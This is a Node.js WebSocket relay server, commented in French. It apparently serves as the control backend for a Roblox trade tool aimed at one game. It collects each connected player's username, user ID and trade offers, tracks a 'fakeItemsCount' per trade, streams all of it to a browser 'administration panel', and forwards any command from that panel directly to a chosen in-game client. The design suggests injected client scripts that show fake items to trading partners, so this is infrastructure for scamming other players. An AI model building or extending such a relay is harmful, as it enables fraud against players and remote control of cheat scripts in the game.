const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

// Servir les fichiers statiques de l'interface
app.use(express.static(path.join(__dirname, 'public')));

// Health check route
app.get('/', (req, res) => {
  res.send('Trade Bridge Server is running! Connect via WebSocket.');
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', robloxClients: robloxClients.size, browserClients: browserClients.size });
});

// Stocker les connexions actives
const robloxClients = new Map(); // clientId -> { ws, playerInfo, tradeInfo }
const browserClients = new Set(); // set of ws browser connections

// Diffuser l'état général des joueurs connectés à tous les navigateurs ouverts
// Seuls les joueurs dans le jeu Voler un Brainrot (109983668079237) sont affichés
const TARGET_PLACE_ID = '109983668079237';

function broadcastToBrowsers() {
  const playersList = Array.from(robloxClients.entries())
    .filter(([id, client]) => client.playerInfo.placeId === TARGET_PLACE_ID)
    .map(([id, client]) => ({
      id,
      playerInfo: client.playerInfo,
      tradeInfo: client.tradeInfo,
      isOnline: true
    }));

  const payload = JSON.stringify({
    type: 'players_update',
    players: playersList
  });

  browserClients.forEach(browserWs => {
    if (browserWs.readyState === WebSocket.OPEN) {
      browserWs.send(payload);
    }
  });
}

// Gérer les connexions WebSocket
wss.on('connection', (ws, req) => {
  // Parsing robuste de l'URL pour gérer les routes de type /roblox ou /browser
  const parsedUrl = new URL(req.url, 'http://localhost');
  const pathname = parsedUrl.pathname;
  let clientType = pathname.replace(/^\/|\/$/g, ''); // 'roblox' ou 'browser'

  // Fallback sur les paramètres de requête si le path est vide
  if (!clientType) {
    clientType = parsedUrl.searchParams.get('type');
  }

  const clientId = parsedUrl.searchParams.get('clientId') || Math.random().toString(36).substring(2, 11);

  if (clientType === 'roblox') {
    console.log(`[ROBLOX] Nouveau client connecté : ${clientId}`);
    
    // Initialiser la structure de données pour ce client
    robloxClients.set(clientId, {
      ws,
      playerInfo: { username: 'Inconnu', displayName: 'Inconnu', userId: 0, placeId: '0' },
      tradeInfo: { inTrade: false, otherPlayer: null, fakeItemsCount: 0 }
    });

    // Écouter les messages du client Roblox
    ws.on('message', (message) => {
      try {
        const data = JSON.parse(message);
        console.log(`[ROBLOX][${clientId}] Message reçu :`, data);
        const client = robloxClients.get(clientId);
        if (!client) return;

        if (data.type === 'init') {
          // Initialisation des données du joueur
          client.playerInfo = {
            username: data.username || 'Inconnu',
            displayName: data.displayName || 'Inconnu',
            userId: data.userId || 0,
            placeId: data.placeId || '0',
            animalsList: data.animalsList || []
          };
          client.tradeInfo = {
            inTrade: data.inTrade || false,
            otherPlayer: data.otherPlayer || null,
            fakeItemsCount: data.fakeItemsCount || 0
          };
          broadcastToBrowsers();
        } else if (data.type === 'trade_update') {
          // Mise à jour de l'état d'un échange
          client.tradeInfo = {
            inTrade: data.inTrade,
            otherPlayer: data.otherPlayer || null,
            fakeItemsCount: data.fakeItemsCount || 0,
            isYourReady: data.isYourReady || false,
            isOtherReady: data.isOtherReady || false,
            yourOffer: data.yourOffer || [],
            otherOffer: data.otherOffer || []
          };
          broadcastToBrowsers();
        }
      } catch (err) {
        console.error(`[ROBLOX] Erreur lors du parsing du message de ${clientId}:`, err);
      }
    });

    ws.on('close', () => {
      console.log(`[ROBLOX] Client déconnecté : ${clientId}`);
      robloxClients.delete(clientId);
      broadcastToBrowsers();
    });

    ws.on('error', (err) => {
      console.error(`[ROBLOX][${clientId}] Erreur :`, err);
    });

  } else if (clientType === 'browser') {
    console.log(`[BROWSER] Nouveau navigateur connecté`);
    browserClients.add(ws);

    // Lui envoyer instantanément la liste des joueurs en ligne
    broadcastToBrowsers();

    // Écouter les commandes envoyées depuis le navigateur
    ws.on('message', (message) => {
      try {
        const data = JSON.parse(message);
        console.log(`[BROWSER] Commande reçue :`, data);

        // Les commandes doivent cibler un joueur Roblox spécifique
        const targetClientId = data.targetClientId;
        const robloxClient = robloxClients.get(targetClientId);

        if (robloxClient && robloxClient.ws.readyState === WebSocket.OPEN) {
          // Transmettre la commande directement au client Roblox concerné !
          robloxClient.ws.send(JSON.stringify(data));
          console.log(`[BRIDGE] Commande transmise à Roblox (${targetClientId}) :`, data.action);
        } else {
          console.warn(`[BRIDGE] Client Roblox cible introuvable ou hors ligne : ${targetClientId}`);
        }
      } catch (err) {
        console.error('[BROWSER] Erreur de commande :', err);
      }
    });

    ws.on('close', () => {
      console.log(`[BROWSER] Navigateur déconnecté`);
      browserClients.delete(ws);
    });
  }
});

// Proxy d'image local pour contourner à 100% les restrictions CORS et hotlinking des avatars Roblox
const https = require('https');
app.get('/avatar/:userId', (req, res) => {
  const userId = req.params.userId;
  if (!userId || userId === '0' || userId === '1') {
    res.redirect('https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png');
    return;
  }
  
  https.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`, (apiRes) => {
    let data = '';
    apiRes.on('data', chunk => data += chunk);
    apiRes.on('end', () => {
      try {
        const json = JSON.parse(data);
        if (json && json.data && json.data[0] && json.data[0].imageUrl) {
          https.get(json.data[0].imageUrl, (imgRes) => {
            res.setHeader('Content-Type', 'image/png');
            imgRes.pipe(res);
          }).on('error', () => {
            res.redirect(`https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`);
          });
        } else {
          res.redirect(`https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`);
        }
      } catch (e) {
        res.redirect(`https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`);
      }
    });
  }).on('error', () => {
    res.redirect(`https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`);
  });
});

// Lancer le serveur local
server.listen(PORT, () => {
  console.log(`=======================================================`);
  console.log(`🚀 SERVEUR DE TRADING PRO LANCÉ EN LOCAL AVEC SUCCÈS 🚀`);
  console.log(`👉 Panel d'Administration : http://localhost:${PORT}`);
  console.log(`=======================================================`);
});
